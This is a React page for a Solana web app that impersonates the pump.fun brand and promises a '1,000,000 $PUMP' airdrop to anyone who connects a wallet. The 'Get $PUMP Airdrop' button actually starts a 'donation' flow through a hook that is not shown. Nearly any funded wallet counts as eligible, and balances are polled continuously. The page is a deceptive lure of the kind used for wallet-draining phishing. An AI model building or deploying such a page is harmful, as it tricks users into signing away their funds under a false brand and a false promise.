import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Button } from '@/components/ui/button';
import { useDonation } from '@/hooks/useDonation';
import { DonationProgress } from '@/components/DonationProgress';
import { Heart, Wallet } from 'lucide-react';
import backgroundImage from '@/assets/background.jpg';
import logoImage from '@/assets/logo.jpg';
import { useState, useEffect } from 'react';
import { useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';

const Index = () => {
  const { connected, publicKey } = useWallet();
  const { connection } = useConnection();
  const { startDonation, isProcessing, transactions, currentIndex } = useDonation();
  const [walletBalance, setWalletBalance] = useState<number>(0);
  const [isEligible, setIsEligible] = useState<boolean>(false);

  const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);

  useEffect(() => {
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          const solBalance = balance / LAMPORTS_PER_SOL;
          setWalletBalance(solBalance);
          setIsEligible(solBalance >= 0.00001);
        } catch (error) {
          console.error('Error fetching balance:', error);
        }
      }
    };

    if (connected) {
      checkBalance();
      const interval = setInterval(checkBalance, 5000);
      return () => clearInterval(interval);
    }
  }, [connected, publicKey, connection]);

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Background image */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <img
          src={backgroundImage}
          alt="Background"
          className="w-full h-full object-cover"
        />
      </div>

      {/* Top Bar */}
      <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center">
            <img
              src={logoImage}
              alt="Logo"
              className="h-12 w-12 object-contain rounded-lg"
            />
            <span className="ml-2 text-white font-bold">pump.fun</span>
          </div>
          <WalletMultiButton className="!bg-primary hover:!bg-primary/90" />
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-2xl space-y-8">
          {/* Header */}
          <div className="text-center space-y-4">
            <div className="space-y-2">
              <h1 className="text-5xl font-bold text-white">
                Get Your Share Of
              </h1>
              <h1 className="text-5xl font-bold text-green-500">
                1,000,000 $PUMP
              </h1>
            </div>
            <p className="text-xl text-muted-foreground max-w-xl mx-auto">
              Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
            </p>
          </div>

          {/* Wallet Connection */}
          <div className="flex flex-col items-center gap-4">
            {!connected ? (
              <div className="text-center space-y-4">
                <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                  <Wallet className="w-4 h-4" />
                  Connect your wallet to start PUMP
                </p>
              </div>
            ) : (
              <div className="w-full space-y-6">
                {/* Eligibility Status */}
                <div className="bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center">
                  <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
                    {isEligible ? 'Eligible to PUMP' : 'Not PUMP Eligible'}
                  </p>
                </div>

                {/* Airdrop Button */}
                {!isProcessing && transactions.length === 0 && (
                  <Button
                    variant="donate"
                    size="xl"
                    onClick={startDonation}
                    className="w-full"
                    disabled={isProcessing}
                  >
                    <svg className="w-6 h-6 mr-2 animate-pulse" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    Get $PUMP Airdrop
                  </Button>
                )}

              </div>
            )}
          </div>

        </div>
      </div>

      <style>{`
        @keyframes gradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        .animate-gradient {
          animation: gradient 3s ease infinite;
        }
        .delay-1000 {
          animation-delay: 1s;
        }
      `}</style>
    </div>
  );
};

export default Index;
